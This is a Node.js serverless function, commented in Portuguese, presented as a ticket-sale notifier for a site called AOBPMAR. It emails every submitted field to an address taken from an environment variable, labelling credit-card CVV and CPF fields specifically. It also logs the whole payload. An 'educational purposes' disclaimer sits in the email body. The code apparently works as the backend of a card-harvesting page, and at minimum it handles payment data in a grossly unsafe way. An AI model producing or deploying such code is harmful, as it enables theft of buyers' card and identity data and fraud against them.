const nodemailer = require('nodemailer');

// Configurar transportador de email
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_DE_ENVIO,
    pass: process.env.SENHA_DO_EMAIL
  }
});

exports.handler = async (event, context) => {
  // Apenas aceitar POST
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ sucesso: false, mensagem: 'Método não permitido' })
    };
  }

  try {
    // Parse dos dados JSON
    const dados = JSON.parse(event.body);

    // Validar dados básicos
    if (!dados.nome || !dados.email) {
      return {
        statusCode: 400,
        body: JSON.stringify({ sucesso: false, mensagem: 'Nome e email são obrigatórios' })
      };
    }

    // Formatar corpo do email
    let corpo = 'Uma nova venda foi registrada no site da AOBPMAR.\n';
    corpo += 'ATENÇÃO: Este e-mail contém dados sensíveis (cartão de crédito) a pedido do usuário para fins educacionais.\n';
    corpo += '=' + '='.repeat(39) + '\n\n';

    // Adicionar todos os dados do pedido
    for (const [chave, valor] of Object.entries(dados)) {
      if (valor) {
        let chave_formatada = chave.replace(/_/g, ' ').split(' ').map(word => word.charAt(0).toUpperCase() + word.slice(1)).join(' ');
        if (chave.toLowerCase() === 'cvv') chave_formatada = 'CVV';
        if (chave.toLowerCase() === 'cpf') chave_formatada = 'CPF';
        corpo += `${chave_formatada}: ${valor}\n`;
      }
    }

    corpo += '\n' + '='.repeat(40) + '\n';
    corpo += 'Este e-mail serviu como notificação.';

    // Preparar email
    const mailOptions = {
      from: process.env.EMAIL_DE_ENVIO,
      to: process.env.EMAIL_DE_DESTINO,
      subject: `Nova Venda de Ingresso: ${dados.barco} (Pedido para ${dados.nome})`,
      text: corpo
    };

    // Enviar email
    await transporter.sendMail(mailOptions);

    console.log(`Email enviado com sucesso para ${process.env.EMAIL_DE_DESTINO}`);
    console.log(`Dados recebidos: ${JSON.stringify(dados)}`);

    // Retornar sucesso
    return {
      statusCode: 200,
      body: JSON.stringify({ 
        sucesso: true, 
        mensagem: 'Dados salvos e email enviado com sucesso' 
      })
    };

  } catch (error) {
    console.error('Erro ao processar requisição:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ 
        sucesso: false, 
        mensagem: `Erro ao processar: ${error.message}` 
      })
    };
  }
};

